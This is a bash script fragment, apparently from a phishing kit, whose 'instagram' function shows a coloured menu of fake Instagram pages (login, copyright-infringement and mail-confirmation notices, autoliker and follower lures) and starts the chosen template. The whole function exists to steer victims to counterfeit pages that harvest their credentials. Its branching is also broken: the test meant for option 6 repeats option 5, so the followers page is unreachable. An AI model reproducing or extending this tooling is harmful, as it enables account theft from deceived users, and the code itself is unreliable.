#!/usr/bin/env bash

instagram(){
banner
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Copyright Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Mail Confirmation Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Copyright Infringement Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m IG Autoliker Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m IG Followers Page\e[0m\n"

printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' insta_option

if [[ $insta_option == 1 || $insta_option == 01 ]]; then
server="instagram"
start1

elif [[ $insta_option == 2 || $insta_option == 02 ]]; then
server="cpr"
start1

elif [[ $insta_option == 3 || $insta_option == 03 ]]; then
server="mcp"
start1

elif [[ $insta_option == 4 || $insta_option == 04 ]]; then
server="cip"
start1

elif [[ $insta_option == 5 || $insta_option == 05 ]]; then
server="igauth"
start1

elif [[ $insta_option == 5 || $insta_option == 05 ]]; then
server="instafollowers"
start1

else
printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
clear
menu
fi

}